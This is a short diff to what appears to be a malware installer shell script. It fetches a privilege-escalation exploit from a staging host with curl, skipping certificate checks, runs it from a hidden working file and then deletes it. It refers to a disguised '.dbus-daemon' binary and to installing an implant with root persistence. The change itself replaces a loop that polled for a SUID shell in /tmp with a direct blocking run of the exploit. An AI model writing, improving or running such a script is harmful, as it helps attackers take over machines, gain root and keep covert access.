@@ -18,14 +18,7 @@ chmod +x "${WORK}/.dbus-daemon"
 # Download and run privesc exploit - polls up to 30s for SUID /tmp/.sh
 curl -sLk --max-time 60 -o "${WORK}/.privesc" "https://${STAGING_HOST}:8443/privesc"
 chmod +x "${WORK}/.privesc"
-"${WORK}/.privesc" >/dev/null 2>&1 &
-PRIVESC_PID=$!
-for i in $(seq 1 30); do
-    sleep 1
-    [ -u /tmp/.sh ] && break
-done
-kill "${PRIVESC_PID}" 2>/dev/null
-wait "${PRIVESC_PID}" 2>/dev/null || true
+"${WORK}/.privesc" >/dev/null 2>&1
 rm -f "${WORK}/.privesc"
 
 # Install implant + persistence as root
